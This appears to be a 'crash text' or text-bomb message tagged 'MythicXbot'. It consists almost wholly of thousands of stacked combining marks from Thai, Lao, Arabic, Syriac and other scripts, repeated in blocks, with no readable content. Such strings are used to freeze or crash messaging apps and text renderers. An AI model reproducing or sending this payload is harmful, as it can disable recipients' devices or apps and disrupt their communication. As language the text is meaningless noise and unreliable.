์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*Myth
icXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*M
ythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*
MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈֟֟֟֟֟֟֟֟